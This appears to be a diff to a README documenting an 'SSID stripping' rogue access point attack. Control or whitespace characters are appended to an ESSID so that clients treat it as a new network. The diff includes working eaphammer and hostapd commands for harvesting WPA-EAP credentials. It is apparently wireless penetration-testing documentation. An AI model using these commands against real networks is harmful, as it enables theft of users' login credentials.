@@ -4,30 +4,34 @@ Add a non-printable UTF8 character to the AP ESSID to avoid new security setting
 
 With this attack, the AP name is the same for the client, but Windows detects the full name as a new one, as it sees the non-printable characters. Then, the client asks for the username, password, etc. when logging in. Like a new network.
 
-In this case we use '/r' because is not showed by Android and it may go unnoticed as a new line in Windows, Linux and iOS.
 
-Other option is to use:
-- '/t' for a tab
-- '/n' for a enter, like '\r'
+The options are:
+- '\r' for a new line.
+- '\t' for a tab.
+- '\n' for a enter, like '\r'.
+- '\x20' for a space, like adding a white space after the SSID option using quotes.
 
-If you want to change it you can modify the file: 
-"eaphammer/core/hostapd_config.py"
 
-## Attacking with Eaphammer
+## Attacking with original Eaphammer (only space)
 
-### Attack on windows
+```bash
+python3 ./eaphammer -i wlan3 --auth wpa-eap --essid "wifi-AP " --creds --negotiate balanced
+```
 
-### Attack on linux
+## Attacking with modified Eaphammer
 
-### Attack on Android
+An example using the  `--stripping '\r'`  parameter is shown below. In this case we use '\r' because is not showed by Android and it may go unnoticed as a new line in Windows, Linux and iOS.
 
-### Attack on iOS
+
+```bash
+python3 ./eaphammer -i wlan0 --auth wpa-eap --essid wifi-AP --creds --negotiate balanced --essid-stripping '\r'
+```
 
 ## Attacking manually using hostapd
 
 We only have to use the UTF8 essid options, and use the P options in the essid2 in the hostapd.conf file:
 ``` bash
-ssid2=P"wifi-AP/n"
+ssid2=P"wifi-AP\x20"
 utf8_ssid=1
 ```
 
